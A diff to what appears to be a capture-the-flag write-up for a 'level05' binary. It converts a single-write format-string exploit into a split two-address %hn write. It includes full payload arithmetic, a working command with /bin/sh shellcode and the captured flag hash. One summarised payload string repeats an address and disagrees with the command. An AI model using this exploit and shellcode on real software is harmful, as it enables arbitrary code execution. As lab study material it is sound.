@@ -63,11 +63,28 @@ shellcode address : 0xffffdeae
 
 - The function shellcode address in decimal is 4294958766 
 - We have to substract the 4 bytes of the destination address written at the start of the string : 4294958766 - 4 = 4294958762
+- Our number of bytes is too big to be printed in a single destintation => we need to split the bytes in two addresses :
 
-- The exploit string will be formatted like that : `<destination addr> + %<value in decimal>d + %4$n` : `\xe0\x97\x04\x08%4294958762%10$n`
+\xe0\x97\x04\x08
+\xe0\x97\x04\x08 + 2 = 0x080497e0 + 2 = \xe2\x97\x04\x08
+
+we split our address in the two adresses :
+0xffffdeae => 0xffff + 0xdeae
+
+0xffff => 65535
+0xdeae => 57006 
+57006 - 8 = 56998
+
+- TODO explain
+
+65535 - 56998 = 8537 - 8 = 8529
+
+- The exploit string will be formatted like that : 
+`<destination addr> + <destination addr + 2> + %<value in decimal2 - 2 two addresses length (8) >d + %10$n + %<value in decimal1 - value in decimal2>d + %11$n` :
+`"\xe2\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998x" + "%10$hn" + "%8529x" + "%11$hn"`
 - To get the exploit working we have to keep stdin open with the `cat` trick like previous exercices :
 
 ```
-(python -c 'print("\xe0\x97\x04\x08%4294958762%10$n")' ; cat) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998x" + "%10$hn" + "%8529x" + "%11$hn")' ; cat) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05
 ```
 =>d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
